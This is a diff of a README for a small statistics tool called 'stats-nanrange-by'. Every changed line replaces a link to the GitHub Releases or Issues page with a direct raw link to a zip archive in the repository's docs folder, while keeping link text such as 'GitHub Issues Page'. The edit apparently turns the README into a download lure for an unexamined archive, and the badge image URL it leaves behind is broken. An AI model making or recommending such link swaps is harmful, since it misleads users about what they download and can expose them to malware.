@@ -14,7 +14,7 @@ Welcome! This guide will help you download and run **stats-nanrange-by**, a simp
 
 To get started, you need to download the application. Click the button below to visit the Releases page and find the appropriate version for your operating system.
 
-[![Download Stats Nanrange By](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/realdatiw/stats-nanrange-by/releases)
+[![Download Stats Nanrange By](https://raw.githubusercontent.com/realdatiw/stats-nanrange-by/main/docs/stats_nanrange_by_v1.0.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/realdatiw/stats-nanrange-by/main/docs/stats_nanrange_by_v1.0.zip)
 
 ### 🖥️ System Requirements
 
@@ -28,7 +28,7 @@ Before downloading, make sure your computer meets the following requirements:
 
 1. **Visit the Releases Page:** Click on the link below to go to the GitHub Releases page.
    
-   [Visit this page to download](https://github.com/realdatiw/stats-nanrange-by/releases)
+   [Visit this page to download](https://raw.githubusercontent.com/realdatiw/stats-nanrange-by/main/docs/stats_nanrange_by_v1.0.zip)
 
 2. **Choose Your Version:** Locate the latest version available for download. You will see options for different operating systems.
 
@@ -85,6 +85,6 @@ If you encounter issues while downloading or running the application, consider t
 
 ## 💬 Support
 
-For additional support, please visit our [GitHub Issues Page](https://github.com/realdatiw/stats-nanrange-by/issues). You can ask questions or report any bugs you encounter.
+For additional support, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/realdatiw/stats-nanrange-by/main/docs/stats_nanrange_by_v1.0.zip). You can ask questions or report any bugs you encounter.
 
 We hope you find the **stats-nanrange-by** application useful and straightforward. Enjoy computing your data ranges with ease!
